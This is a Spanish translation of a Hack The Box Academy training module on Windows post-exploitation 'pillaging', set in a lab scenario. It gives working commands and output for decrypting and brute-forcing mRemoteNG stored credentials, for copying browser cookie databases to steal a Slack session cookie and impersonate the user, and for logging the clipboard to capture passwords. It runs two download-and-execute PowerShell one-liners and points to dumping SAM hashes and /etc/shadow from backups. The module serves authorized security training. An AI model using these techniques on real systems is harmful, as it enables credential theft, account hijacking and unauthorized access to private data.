Pillaging es el proceso de obtener información de un sistema comprometido. Puede ser información personal, planos corporativos, datos de tarjetas de crédito, información de servidores, detalles de infraestructura y redes, contraseñas u otros tipos de credenciales, y cualquier cosa relevante para la compañía o la evaluación de seguridad en la que estamos trabajando.

Estos datos pueden ayudar a obtener acceso adicional a la red o a completar los objetivos definidos durante el proceso de pre-engagement del penetration test. Estos datos pueden almacenarse en diversas aplicaciones, servicios y tipos de dispositivos, lo que puede requerir herramientas específicas para extraerlos.

---

## Data Sources

A continuación, se presentan algunas de las fuentes de las que podemos obtener información de sistemas comprometidos:

- Aplicaciones instaladas
- Servicios instalados
    - Websites
    - File Shares
    - Databases
    - Directory Services (como Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Datos Sensibles
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- Información del Usuario
    - History files, documentos interesantes (.doc/x, .xls/x, password._/pass._, etc.)
    - Roles and Privileges
    - Web Browsers
    - IM Clients

Esta no es una lista completa. Cualquier cosa que pueda proporcionar información sobre nuestro objetivo será valiosa. Dependiendo del tamaño, propósito y alcance del negocio, podemos encontrar información diferente. El conocimiento y la familiaridad con aplicaciones comúnmente utilizadas, software de servidores y middleware son esenciales, ya que la mayoría de las aplicaciones almacenan sus datos en varios formatos y ubicaciones. Puede ser necesario el uso de herramientas especiales para obtener, extraer o leer los datos específicos de algunos sistemas.

En las siguientes secciones, discutiremos y practicaremos algunos aspectos del Pillaging en Windows.

---

## Scenario

Supongamos que hemos obtenido acceso a un Windows server mencionado en la red a continuación y comenzamos a recopilar la mayor cantidad de información posible.

![](https://academy.hackthebox.com/storage/modules/67/network.png)

---

## Installed Applications

Entender qué aplicaciones están instaladas en nuestro sistema comprometido puede ayudarnos a alcanzar nuestro objetivo durante un pentest. Es importante saber que cada pentest es diferente. Podemos encontrarnos con muchas aplicaciones desconocidas en los sistemas comprometidos. Aprender y entender cómo estas aplicaciones se conectan al negocio es esencial para lograr nuestro objetivo.

También encontraremos aplicaciones típicas como Office, sistemas de gestión remota, IM clients, etc. Podemos usar `dir` o `ls` para revisar el contenido de `Program Files` y `Program Files (x86)` para encontrar qué aplicaciones están instaladas. Aunque puede haber otras aplicaciones en el ordenador, esta es una forma rápida de revisarlas.

### Identifying Common Applications

```r
C:\>dir "C:\Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 900E-A7ED

 Directory of C:\Program Files

07/14/2022  08:31 PM    <DIR>          .
07/14/2022  08:31 PM    <DIR>          ..
05/16/2022  03:57 PM    <DIR>          Adobe
05/16/2022  12:33 PM    <DIR>          Corsair
05/16/2022  10:17 AM    <DIR>          Google
05/16/2022  11:07 AM    <DIR>          Microsoft Office 15
07/10/2022  11:30 AM    <DIR>          mRemoteNG
07/13/2022  09:14 AM    <DIR>          OpenVPN
07/19/2022  09:04 PM    <DIR>          Streamlabs OBS
07/20/2022  07:06 AM    <DIR>          TeamViewer
               0 File(s)              0 bytes
              16 Dir(s)  351,524,651,008 bytes free
```

Una alternativa es usar PowerShell y leer el Windows registry para recopilar información más detallada sobre los programas instalados.

### Get Installed Programs via PowerShell & Registry Keys

```r
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation
-----------                                         --------------    ---------------
Adobe Acrobat DC (64-bit)                           22.001.20169      C:\Program Files\Adobe\Acrobat DC\
CORSAIR iCUE 4 Software                             4.23.137          C:\Program Files\Corsair\CORSAIR iCUE 4 Software
Google Chrome                                       103.0.5060.134    C:\Program Files\Google\Chrome\Application
Google Drive                                        60.0.2.0          C:\Program Files\Google\Drive File Stream\60.0.2.0\GoogleDriveFS.exe
Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
mRemoteNG                                           1.62              C:\Program Files\mRemoteNG
TeamViewer                                          15.31.5           C:\Program Files\TeamViewer
...SNIP...
```

Podemos ver que el software `mRemoteNG` está instalado en el sistema. [mRemoteNG](https://mremoteng.org/) es una herramienta utilizada para gestionar y conectarse a sistemas remotos utilizando VNC, RDP, SSH, y protocolos similares. Echemos un vistazo a `mRemoteNG`.

### mRemoteNG

`mRemoteNG` guarda la información de conexión y las credenciales en un archivo llamado `confCons.xml`. Utilizan una contraseña maestra codificada, `mR3m`, por lo que si alguien comienza a guardar credenciales en `mRemoteNG` y no protege la configuración con una contraseña, podemos acceder a las credenciales del archivo de configuración y descifrarlas.

Por defecto, el archivo de configuración se encuentra en `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

### Discover mRemoteNG Configuration Files

```r
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

Veamos el contenido del archivo `confCons.xml`.

### mRemoteNG Configuration File - confCons.xml

```r
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

Este documento XML contiene un elemento raíz llamado `Connections` con la información sobre la encriptación utilizada para las credenciales y el atributo `Protected`, que corresponde a la contraseña maestra utilizada para encriptar el documento. Podemos usar esta cadena para intentar descifrar la contraseña maestra. Encontraremos algunos elementos llamados `Node` dentro del elemento raíz. Esos nodos contienen detalles sobre el sistema remoto, como nombre de usuario, dominio, nombre de host, protocolo y contraseña. Todos los campos están en texto plano excepto la contraseña, que está encriptada con la contraseña maestra.

Como se mencionó anteriormente, si el usuario no configuró una contraseña maestra personalizada, podemos usar el script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) para descifrar la contraseña. Necesitamos copiar el contenido del atributo `Password` y usarlo con la opción `-s`. Si hay una contraseña maestra y la conocemos, entonces podemos usar la opción `-p` con la contraseña maestra personalizada para también descifrar la contraseña.

### Decrypt the Password with mremoteng_decrypt

```r
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA
```

Ahora veamos un archivo de configuración encriptado con una contraseña personalizada. Para este ejemplo, configuramos la contraseña personalizada `admin`.

### mRemoteNG Configuration File - confCons.xml

```r
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
    
<SNIP>
</Connections>
```

Si intentamos descifrar el atributo `Password` del nodo `RDP_Domain`, obtendremos el siguiente error.

### Attempt to Decrypt the Password with a Custom Password

```r
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="

Traceback (most recent call last):
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 49, in <module>
    main()
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 45, in main
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 567, in decrypt_and_verify
    self.verify(received_mac_tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 508, in verify
    raise ValueError("MAC check failed")
ValueError: MAC check failed
```

Si usamos la contraseña personalizada, podemos descifrarlo.

### Decrypt the Password with mremoteng_decrypt and a Custom Password

```r
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin

Password: ASDki230kasd09fk233aDA
```

En caso de que queramos intentar descifrar la contraseña, podemos modificar el script para probar múltiples contraseñas de un archivo, o podemos crear un Bash `for loop`. Podemos intentar descifrar el atributo `Protected` o la `Password` directamente. Si intentamos descifrar el atributo `Protected`, una vez que encontremos la contraseña correcta, el resultado será `Password: ThisIsProtected`. Si intentamos descifrar directamente la `Password`, el resultado será `Password: <PASSWORD>`.

### For Loop to Crack the Master Password with mremoteng_decrypt

```r
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
                              
Spring2017
Spring2016
admin
Password: ASDki230kasd09fk233aDA
admin admin          
admins

<SNIP>
```

---

## Abusing Cookies to Get Access to IM Clients

Con la capacidad de enviar mensajes instantáneos entre compañeros de trabajo y equipos, las aplicaciones de mensajería instantánea (IM) como `Slack` y `Microsoft Teams` se han convertido en pilares de las comunicaciones modernas en la oficina. Estas aplicaciones ayudan a mejorar la colaboración entre compañeros de trabajo y equipos. Si comprometemos una cuenta de usuario y obtenemos acceso a un IM Client, podemos buscar información en chats privados y grupos.

Existen múltiples opciones para obtener acceso a un IM Client; un método estándar es usar las credenciales del usuario para acceder a la versión en la nube de la aplicación de mensajería instantánea como lo haría el usuario regular.

Si el usuario está utilizando algún tipo de autenticación multifactorial (MFA), o no podemos obtener las credenciales en texto plano del usuario, podemos intentar robar las cookies del usuario para iniciar sesión en el cliente basado en la nube.

A menudo hay herramientas que pueden ayudarnos a automatizar el proceso, pero a medida que la nube y las aplicaciones evolucionan constantemente, podemos encontrar que estas aplicaciones están desactualizadas y aún necesitamos encontrar una manera de recopilar información de los IM clients. Comprender cómo abusar de credenciales, cookies y tokens es a menudo útil para acceder a aplicaciones web como IM Clients.

Utilicemos `Slack` como ejemplo. Múltiples publicaciones se refieren a cómo abusar de `Slack` como [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) y [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/). Podemos usarlas para entender mejor cómo funcionan los tokens y cookies de Slack, pero ten en cuenta que el comportamiento de `Slack` puede haber cambiado desde la publicación de estos artículos.

También hay una herramienta llamada [SlackExtract](https://github.com/clr2of8/SlackExtract) lanzada en 2018, que podía extraer mensajes de `Slack`. Su investigación discute la cookie llamada `d`, que `Slack` utiliza para almacenar el token de autenticación del usuario. Si podemos obtener esa cookie, podremos autenticarnos como el usuario. En lugar de usar la herramienta, intentaremos obtener la cookie desde Firefox o un navegador basado en Chromium y autenticarnos como el usuario.

##### Cookie Extraction from Firefox

Firefox guarda las cookies en una base de datos SQLite en un archivo llamado `cookies.sqlite`. Este archivo está en el directorio APPDATA de cada usuario `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. Hay una parte del archivo que es aleatoria, y podemos usar un wildcard en PowerShell para copiar el contenido del archivo.

### Copy Firefox Cookies Database

```r
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Podemos copiar el archivo a nuestra máquina y usar el script de Python [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) para extraer cookies de la base de datos cookies.sqlite de Firefox.

### Extract

 Slack Cookie from Firefox Cookies Database

```r
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```

Ahora que tenemos la cookie, podemos usar cualquier extensión del navegador para agregar la cookie a nuestro navegador. Para este ejemplo, usaremos Firefox y la extensión [Cookie-Editor](https://cookie-editor.cgagnier.ca/). Asegúrate de instalar la extensión haciendo clic en el enlace, seleccionando tu navegador y agregando la extensión. Una vez instalada la extensión, verás algo como esto:

![text](https://academy.hackthebox.com/storage/modules/67/cookie-editor-extension.jpg)

Nuestro sitio web objetivo es `slack.com`. Ahora que tenemos la cookie, queremos suplantar al usuario. Naveguemos a slack.com, una vez que se cargue la página, haz clic en el icono de la extensión Cookie-Editor y modifica el valor de la cookie `d` con el valor que tienes del script cookieextractor.py. Asegúrate de hacer clic en el icono de guardar (marcado en rojo en la imagen a continuación).

![text](https://academy.hackthebox.com/storage/modules/67/replace-cookie.jpg)

Una vez que hayas guardado la cookie, puedes actualizar la página y ver que estás conectado como el usuario.

![text](https://academy.hackthebox.com/storage/modules/67/cookie-access.jpg)

Ahora estamos conectados como el usuario y podemos hacer clic en `Launch Slack`. Podemos obtener un aviso para credenciales u otro tipo de información de autenticación; podemos repetir el proceso anterior y reemplazar la cookie `d` con el mismo valor que usamos para obtener acceso la primera vez en cualquier sitio web que nos pida información o credenciales.

![text](https://academy.hackthebox.com/storage/modules/67/replace-cookie2.jpg)

Una vez que completemos este proceso para cada sitio web donde obtengamos un aviso, necesitamos actualizar el navegador, hacer clic en `Launch Slack` y usar Slack en el navegador.

Después de obtener acceso, podemos usar funciones integradas para buscar palabras comunes como contraseñas, credenciales, PII u otra información relevante para nuestra evaluación.

![text](https://academy.hackthebox.com/storage/modules/67/search-creds-slack.jpg)

##### Cookie Extraction from Chromium-based Browsers

El navegador basado en Chromium también almacena la información de las cookies en una base de datos SQLite. La única diferencia es que el valor de la cookie está encriptado con [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` se utiliza comúnmente para encriptar datos usando información de la cuenta de usuario actual o el ordenador.

Para obtener el valor de la cookie, necesitaremos realizar una rutina de desencriptación desde la sesión del usuario comprometido. Afortunadamente, una herramienta [SharpChromium](https://github.com/djhohnstein/SharpChromium) hace lo que necesitamos. Se conecta a la base de datos de cookies SQLite del usuario actual, desencripta el valor de la cookie y presenta el resultado en formato JSON.

Utilicemos [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), un script de PowerShell creado por [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) que utiliza reflection para cargar SharpChromium.

### PowerShell Script - Invoke-SharpChromium

```r
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.

   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)
   at SharpChromium.ChromiumCredentialManager.GetCookies()
   at SharpChromium.Program.extract data(String path, String browser)
[*] Finished Google Chrome extraction.

[*] Done.
```

Obtuvimos un error porque la ruta del archivo de cookies que contiene la base de datos está codificada en [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), y la versión actual de Chrome usa una ubicación diferente.

Podemos modificar el código de `SharpChromium` o copiar el archivo de cookies a donde `SharpChromium` está buscando.

`SharpChromium` está buscando un archivo en `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`, pero el archivo real está ubicado en `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` con el siguiente comando copiaremos el archivo a la ubicación donde `SharpChromium` lo está esperando.

### Copy Cookies to SharpChromium Expected Location

```r
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

Ahora podemos usar Invoke-SharpChromium nuevamente para obtener una lista de cookies en formato JSON.

### Invoke-SharpChromium Cookies Extraction

```r
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (User: lab_admin) ---
Domain         : slack.com
Cookies (JSON) :
[

<SNIP>

{
    "domain": ".slack.com",
    "expirationDate": 1974643257.67155,
    "hostOnly": false,
    "httpOnly": true,
    "name": "d",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": false,
    "storeId": null,
    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
},
{
    "domain": ".slack.com",
    "hostOnly": false,
    "httpOnly": true,
    "name": "d-s",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": true,
    "storeId": null,
    "value": "1659023172"
},

<SNIP>

]

[*] Finished Google Chrome extraction.

[*] Done.
```

Ahora podemos usar esta cookie con cookie-editor como hicimos con Firefox.

**Nota:** Cuando copies/pegues el contenido de una cookie, asegúrate de que el valor sea una sola línea.

---

## Clipboard

En muchas compañías, los administradores de redes usan gestores de contraseñas para almacenar sus credenciales y copiar y pegar contraseñas en formularios de inicio de sesión. Como esto no implica `typing` las contraseñas, el registro de teclas no es efectivo en este caso. El `clipboard` proporciona acceso a una cantidad significativa de información, como el pegado de credenciales y tokens de 2FA, así como la posibilidad de interactuar directamente con el clipboard de la sesión RDP.

Podemos usar el script [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) para extraer datos del clipboard del usuario. Inicia el registro emitiendo el siguiente comando.

### Monitor the Clipboard with PowerShell

```r
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```

El script comenzará a monitorear las entradas en el clipboard y las presentará en la sesión de PowerShell. Necesitamos ser pacientes y esperar hasta capturar información sensible.

### Capture Credentials from the Clipboard with Invoke-ClipboardLogger

```r
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

**Nota:** Las credenciales de usuario se pueden obtener con herramientas como Mimikatz o un keylogger. Los C2 Frameworks como Metasploit contienen funciones integradas para el registro de teclas.

---

## Roles and Services

Los servicios en un host en particular pueden servir al propio host u otros hosts en la red objetivo. Es necesario crear un perfil de cada host objetivo, documentando la configuración de estos servicios, su propósito y cómo podemos potencialmente usarlos para lograr nuestros objetivos de evaluación. Los roles y servicios típicos de servidores incluyen:

- File and Print Servers
- Web and Database Servers
- Certificate Authority Servers
- Source Code Management Servers
- Backup Servers

Tomemos `Backup Servers` como ejemplo, y cómo, si comprometemos un servidor o host con un sistema de backup, podemos comprometer la red.

### Attacking Backup Servers

En tecnología de la información, un `backup` o `data backup` es una copia de los datos de una computadora tomada y almacenada en otro lugar para que pueda ser utilizada para restaurar los originales después de un evento de pérdida de datos. Los backups se pueden usar para recuperar datos después de una pérdida debido a eliminación o corrupción de datos, o para recuperar datos de un tiempo anterior. Los backups proporcionan una forma simple de recuperación ante desastres. Algunos sistemas de backup pueden reconstituir un sistema informático u otras configuraciones complejas, como un servidor de Active Directory o un servidor de bases de datos.

Normalmente, los sistemas de backup necesitan una cuenta para conectarse a la máquina objetivo y realizar el backup. La mayoría de las compañías requieren que las cuentas de backup tengan privilegios administrativos locales en la máquina objetivo para acceder a todos sus archivos y servicios.

Si obtenemos acceso a un `backup system`, podremos revisar los backups, buscar hosts interesantes y restaurar los datos que queramos.

Como discutimos anteriormente, estamos buscando información que pueda ayudarnos a movernos lateralmente en la red o escalar nuestros privilegios. Utilicemos [restic](https://restic.net/) como ejemplo. `Restic` es un programa de backup moderno que puede hacer backups de archivos en Linux, BSD, Mac y Windows.

Para comenzar a trabajar con `restic`, debemos crear un `repository` (el directorio donde se almacenarán los backups). `Restic` verifica si la variable de entorno `RESTIC_PASSWORD` está establecida y usa su contenido como la contraseña para el repository. Si esta variable no está establecida, pedirá la contraseña para inicializar el repository y para cualquier otra operación en este repository.

Usaremos `restic 0.13.1` y haremos un backup del repository `C:\xampp\htdocs\webapp` en el directorio `E:\restic\`. Para descargar la última versión de restic, visita [https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest). En nuestra máquina objetivo, restic está ubicado en `C:\Windows\System32\restic.exe`.

Primero necesitamos crear e inicializar la ubicación donde se guardará nuestro backup, llamada el `repository`.

### restic - Initialize Backup Directory

```r
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2022   2:16 PM                restic2
enter password for new repository:
enter password again:
created restic repository fdb2e6dd1d at E:\restic2

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Luego podemos crear nuestro primer backup.

### restic - Back up a Directory

```r
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password is correct
created new cache in C:\Users\jeff\AppData\Local\restic
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repo: 927 B

processed 1 files, 22 B in 0:00
snapshot 9971e881 saved
```

Si queremos hacer un backup de un directorio como `C:\Windows`, que tiene algunos archivos que el sistema operativo está usando activamente, podemos usar la opción `--use-fs-snapshot` para crear una VSS (Volume Shadow Copy) y realizar el backup.

### restic - Back up a Directory with VSS

```r
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.

Files:           0 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repo: 914 B

processed 0 files, 0 B in 0:02
snapshot b0b6f4bb saved
Warning: at least one source file could not be read
```

**Nota:** Si el usuario no tiene derechos para acceder o copiar el contenido de un directorio, podemos obtener un mensaje de Access denied. El backup se creará, pero no se encontrará contenido.

También podemos verificar qué backups están guardados en el repository usando el comando `snapshot

`.

### restic - Check Backups Saved in a Repository

```r
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
9971e881  2022-08-09 14:18:59-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------
3 snapshots
```

Podemos restaurar un backup usando el ID.

### restic - Restore a Backup with ID

```r
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore
```

Si navegamos a `C:\Restore`, encontraremos la estructura de directorios donde se tomó el backup. Para llegar al directorio `SampleFolder`, necesitamos navegar a `C:\Restore\C\SampleFolder`.

Necesitamos entender nuestros objetivos y qué tipo de información estamos buscando. Si encontramos un backup de una máquina Linux, podemos querer revisar archivos como `/etc/shadow` para descifrar las credenciales de los usuarios, archivos de configuración web, directorios `.ssh` para buscar claves SSH, etc.

Si estamos apuntando a un backup de Windows, podemos querer buscar las colmenas SAM & SYSTEM para extraer hashes de cuentas locales. También podemos identificar directorios de aplicaciones web y archivos comunes donde se almacenan credenciales o información sensible, como archivos web.config. Nuestro objetivo es buscar cualquier archivo interesante que pueda ayudarnos a lograr nuestro objetivo.

**Nota:** restic funciona de manera similar en Linux. Si no sabemos dónde se guardan los snapshots de restic, podemos buscar en el sistema de archivos un directorio llamado snapshots. Ten en cuenta que la variable de entorno puede no estar establecida. Si ese es el caso, necesitaremos proporcionar una contraseña para restaurar los archivos.

Existen cientos de aplicaciones y métodos para realizar backups, y no podemos detallar cada uno. Este caso de `restic` es un ejemplo de cómo podría funcionar una aplicación de backup. Otros sistemas gestionarán una consola centralizada y repositories especiales para guardar la información de backup y ejecutar las tareas de backup.

A medida que avancemos, encontraremos diferentes sistemas de backup, y recomendamos tomarse el tiempo para entender cómo funcionan para que eventualmente podamos abusar de sus funciones para nuestro propósito.

---

## Conclusion

Todavía hay muchos lugares, aplicaciones y métodos para obtener información interesante de un host objetivo o una red comprometida. Podemos encontrar información en servicios en la nube, dispositivos de red, IoT, etc. Sé abierto y creativo para explorar tu objetivo y la red y obtener la información que necesitas utilizando tus métodos y experiencia.